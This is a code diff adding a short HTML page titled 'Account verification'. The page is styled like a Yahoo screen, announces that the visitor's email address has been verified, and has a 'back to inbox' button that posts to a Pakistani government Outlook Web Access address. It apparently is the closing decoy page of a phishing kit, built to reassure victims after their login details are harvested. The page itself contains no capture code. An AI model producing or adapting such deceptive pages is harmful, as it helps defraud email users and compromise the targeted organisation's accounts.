@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html id="Stencil" class="js yui3-js-enabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
+        <meta name="format-detection" content="telephone=no">
+        <title>Account verification</title>
+        <link href="combo1.asc" rel="stylesheet" type="text/css">
+       
+   </head>
+    <body>
+  <div><center>
+        <a href="" target="_blank">
+            <img style="border:0 none;" src="head.gif" height="106" width="146" alt="">
+        </a>
+</center>
+</div>
+<br>
+
+    
+	<div class="full-page-msg-container" role="status"> <center>
+    <div class="title">Congratulations</div>
+    <p class="margin20 writeup">Your email address has been&nbsp;verified.</p><br>
+    <div class="action-area">
+        <form action="http://mail.ndma.gov.pk/owa/" method="post">
+            <input value="RVclPwuKzvm" name="scrumb" type="hidden">
+            <input value="NWqlTS9PbPW" name="crumb" type="hidden">
+            <input class="pure-button puree-button-secondary action-button"  name="redirect" data-ylk="elm:btn;elmt:redirect" value="back to inbox" type="submit" style="color:blue;background-color:cream">
+        </form>
+    </div>
+</div>
+</center>
+</body></html>
